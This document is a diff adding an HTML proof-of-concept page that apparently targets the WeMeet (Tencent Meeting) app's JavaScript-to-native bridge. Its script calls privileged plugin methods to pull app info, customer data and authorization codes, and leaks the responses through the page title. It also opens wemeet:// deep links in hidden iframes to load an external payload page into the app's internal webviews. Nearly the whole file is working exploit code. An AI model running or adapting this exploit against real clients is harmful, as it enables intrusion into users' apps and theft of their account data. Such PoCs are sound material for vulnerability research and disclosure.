@@ -1,0 +1,72 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P14</h1>
+<script>
+document.title='P14-START';
+var q=[], busy=false;
+function note(t){
+  q.push(String(t));
+  kick();
+}
+function kick(){
+  if(busy || !q.length) return;
+  busy=true;
+  document.title=q.shift();
+  setTimeout(function(){ busy=false; kick(); }, 850);
+}
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+function norm(res){
+  if(typeof res==='string'){
+    try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; }
+  }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var raw=JSON.stringify(res);
+  var msg=String(res.message||raw).replace(/\|/g,'/');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0 || msg.indexOf('webpage config is empty')>=0;
+  note((deny?'D':'A')+':'+(res.callId||'?')+':'+res.code+':'+msg.slice(0,72));
+  if(!deny && raw.length>80){
+    for(var i=0;i<raw.length && i<240;i+=70){
+      note('P:'+(res.callId||'?').split('.').pop()+':'+raw.slice(i,i+70));
+    }
+  }
+};
+var pay='https://gitwhs.github.io/wm-poc-rce/probe9pay.html';
+function iframeScheme(name, scheme){
+  note('IFRAME-'+name);
+  var f=document.createElement('iframe');
+  f.src=scheme;
+  f.style.width='1px'; f.style.height='1px';
+  document.body.appendChild(f);
+}
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('OpenApiPlugin','GetOpenAppInfo',{}); },
+  function(){ call('OpenApiPlugin','GetCustomerData',{}); },
+  function(){ call('OpenApiPlugin','RequestAuthCode',{corpId:'wwtest', sdkId:'1001'}); },
+  function(){ call('OpenApiPlugin','Authorize',{corpId:'wwtest', sdkId:'1001', scope:'snsapi_base'}); },
+  function(){ call('OpenApiPlugin','CheckJsApiConfig',{}); },
+  function(){ call('CommonPlugin','LoadUrl',{url:'https://httpbin.org/uuid'}); },
+  function(){ iframeScheme('PAY', 'wemeet://page/pay/webview?url='+encodeURIComponent(pay)); },
+  function(){ iframeScheme('PAYM', 'wemeet://page/pay/main_process_webview?url='+encodeURIComponent(pay)); },
+  function(){ iframeScheme('NX', 'wemeet://page/nxui/webview?url='+encodeURIComponent(pay)); },
+  function(){ iframeScheme('PROF', 'wemeet://page/professional/webview?url='+encodeURIComponent(pay)); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(function(){ note('P14-DONE'); }, 2000); return; }
+  try{ steps[i](); }catch(e){ note('EX:'+e); }
+  i++;
+  setTimeout(next, 900);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
